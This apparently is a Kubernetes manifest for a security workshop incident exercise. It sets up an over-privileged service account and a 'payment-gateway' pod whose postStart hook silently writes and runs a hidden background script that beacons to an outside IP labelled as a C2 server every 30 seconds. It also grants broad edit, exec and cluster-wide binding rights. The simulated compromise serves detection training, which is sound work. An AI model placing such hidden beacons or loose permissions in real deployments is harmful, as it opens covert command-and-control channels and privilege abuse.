apiVersion: v1
kind: Namespace
metadata:
  name: payment-gateway-1
  labels:
    workshop: fsi-security
    exercise: incident
  annotations:
    argocd.argoproj.io/sync-wave: "0"
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: cicd-pipeline-runner-sa
  namespace: payment-gateway-1
  annotations:
    argocd.argoproj.io/sync-wave: "1"
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: workshop-sa-edit-binding
  namespace: payment-gateway-1
  annotations:
    argocd.argoproj.io/sync-wave: "1"
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: edit
subjects:
  - kind: ServiceAccount
    name: cicd-pipeline-runner-sa
    namespace: payment-gateway-1
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: container-executor
  namespace: payment-gateway-1
  annotations:
    argocd.argoproj.io/sync-wave: "1"
rules:
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create", "get"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: workshop-sa-exec-binding
  namespace: payment-gateway-1
  annotations:
    argocd.argoproj.io/sync-wave: "1"
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: container-executor
subjects:
  - kind: ServiceAccount
    name: cicd-pipeline-runner-sa
    namespace: payment-gateway-1
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: must-gather-sa-metadata-binding-1
  annotations:
    argocd.argoproj.io/sync-wave: "1"
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: node-log-viewer
subjects:
  - kind: ServiceAccount
    name: default
    namespace: payment-gateway-1
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-gateway
  namespace: payment-gateway-1
  labels:
    app: payment-gateway
  annotations:
    argocd.argoproj.io/sync-wave: "2"
spec:
  replicas: 1
  selector:
    matchLabels:
      app: payment-gateway
  template:
    metadata:
      labels:
        app: payment-gateway
    spec:
      containers:
        - name: httpd
          image: image-registry.openshift-image-registry.svc:5000/openshift/httpd:latest
          ports:
            - containerPort: 8080
          lifecycle:
            postStart:
              exec:
                command:
                  - /bin/sh
                  - -c
                  - |
                    export C2_SERVER="185.199.108.153"
                    export CODENAME="SHADOW_PIVOT"
                    export ENV_MARKER="ACME_SECRET_KEY_EXFIL_TEST_9921"
                    mkdir -p /tmp/.hidden_toolkit
                    cat > /tmp/.hidden_toolkit/exfil.sh << "EOF"
                    #!/bin/sh
                    while true; do
                      curl --silent --max-time 2 --output /dev/null \
                        --header "X-Agent-ID: SHADOW_PIVOT" \
                        --header "X-Target-Namespace: payment-gateway" \
                        "http://185.199.108.153/api/v1/beacon"
                      sleep 30
                    done
                    EOF
                    chmod +x /tmp/.hidden_toolkit/exfil.sh
                    if [ ! -s /tmp/.hidden_toolkit/exfil.pid ] || ! kill -0 "$(cat /tmp/.hidden_toolkit/exfil.pid)" 2>/dev/null; then
                      /tmp/.hidden_toolkit/exfil.sh > /dev/null 2>&1 &
                      echo $! > /tmp/.hidden_toolkit/exfil.pid
                    fi
                    exit 0
